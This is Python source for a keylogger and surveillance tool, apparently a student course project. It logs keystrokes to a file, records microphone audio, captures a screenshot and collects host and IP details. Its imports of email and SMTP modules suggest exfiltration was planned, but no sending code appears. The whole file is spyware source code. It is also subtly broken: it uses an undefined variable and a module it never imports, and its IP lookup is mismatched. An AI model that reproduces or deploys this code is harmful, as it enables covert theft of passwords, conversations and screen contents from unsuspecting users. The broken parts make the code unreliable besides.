# import necessary libraries
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

import socket
import platform

import win32clipboard

from pynput.keyboard import Key, Listener

import time
import os 

from scipy.io.wavfile import write
import sounddevice as sd 

from cryptography.fernet import Fernet

import getpass
from requests import get 

from multiprocessing import Process, freeze_support
from PIL import ImageGrab


# default variables
keys_info = "key_log.txt"
sys_information= "system.txt"
audio_information = "audio.wav"
file_path = "C:\\Users\\natal\\OneDrive - csulb\\Academics\\Grad School\\2. CSULB\\Courses\\4. Fall 2023\\IS 665 - Cybersec Analytics\\Group Project - Keyloger"
extend = "\\"
microphone_time =10
file_path_txt = file_path+extend+ keys_information
file_path_sys = file_path+extend+sys_information
file_path_audio = file_path+extend+audio_information


# create a basic 
# initialize variables
count = 0 
keys = []


def get_public_ip():
	try:
		# Use httpbin to get public IP address
		response = requests.get("ipinfo.io")
		data = response.json()
		
		# Extract public IP address
		public_ip = data.get("origin", "Unknown")
		
		return public_ip
	except Exception as e:
		return "error"

def computer_information():
	with open(file_path_sys, 'a') as f:
		hostname = socket.gethostname()
		f.write("Hostname: "+hostname+"\n")
		public_IP = get_public_ip()
		#f.write("PublicIP Address: " +public_IP+"\n")
		IPAddr = socket.gethostbyname(hostname)
		f.write("PrivateIP Address" + IPAddr+"\n")
		f.write("processor: " + platform.processor()+"\n")
		f.write("System: " +platform.system()+"\n")
		f.write("Version: " +platform.version()+"\n")
		f.write("Machine: "+platform.machine()+"\n")
		
computer_information()

def microphone():
	#frequency
	fs = 44100
	#time
	seconds=microphone_time

	myrecording = sd.rec(int(seconds*fs), samplerate=fs, channels=2)
	sd.wait()

	write(file_path_audio, fs, myrecording)

microphone()

def on_press(key):
    """Called when a key is pressed"""
    global keys, count

    print(key)
    keys.append(key)
    count += 1 

    if count >= 1:
        count = 0
        write_file(keys)
        keys = []

def write_file(keys):
    """Write keys to a file"""
    with open(file_path + extend + keys_info, "a") as f:
        for key in keys:
            k = str(key).replace("'", "") # convert key to str and remove single quotes
            if k.find("space") > 0: # write a new line if key is spacebar
                f.write('\n')
                f.close()
            elif k.find("Key") == -1: # filter out special keys (Ctrl, Shift, Alt, etc)
                f.write(k)
                f.close()

def on_release(key):
    """Stop keylogger if Esc is released"""
    if key == Key.esc: # if esc is entered, exit keylogger
        return False


def screenshot():
    """Take a screenshot"""
    image = ImageGrab.grab()
    image.save(file_path + extend + "screenshot.png")


if __name__ == "__main__":
    freeze_support()
    Process(target=screenshot).start()

# Listener for keyboard events
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
